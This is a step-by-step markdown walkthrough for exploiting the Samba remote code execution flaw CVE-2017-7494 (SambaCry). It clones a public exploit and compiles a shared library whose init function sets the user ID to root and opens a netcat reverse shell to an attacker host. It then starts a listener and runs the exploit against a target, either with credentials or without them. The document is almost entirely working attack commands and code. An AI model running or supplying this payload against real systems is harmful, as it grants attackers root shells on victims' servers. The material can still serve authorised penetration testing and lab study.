### Clone repo
```
git clone https://github.com/joxeankoret/CVE-2017-7494
```

### Create virtual environment and install dependencies
```
virtualenv -p /usr/bin/python2.7 exploit2
source exploit2/bin/activate
pip install pyasn1
pip install pycryptodome
```

### Create reverse shell
```
cd CVE-2017-7494
```

### Open shell.c and insert
```
#include <stdio.h>
#include <stdlib.h>
int samba_init_module(void)
{
	setresuid(0,0,0);
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/f");
}
```

### Compile
```
gcc -o shell.so -shared shell.c -fPIC
```

### Start listener
```
nc -lnvp <lport>
```

### Run exploit
```
./cve_2017_7494.py -t <rhost> -u <user> -P <password> --custom=shell.so
```

### Or run without user if user not needed for share
```
./cve_2017_7494.py -t <rhost> --custom=shell.so
```

### References
* https://github.com/opsxcq/exploit-CVE-2017-7494  
* https://www.exploit-db.com/exploits/42084  

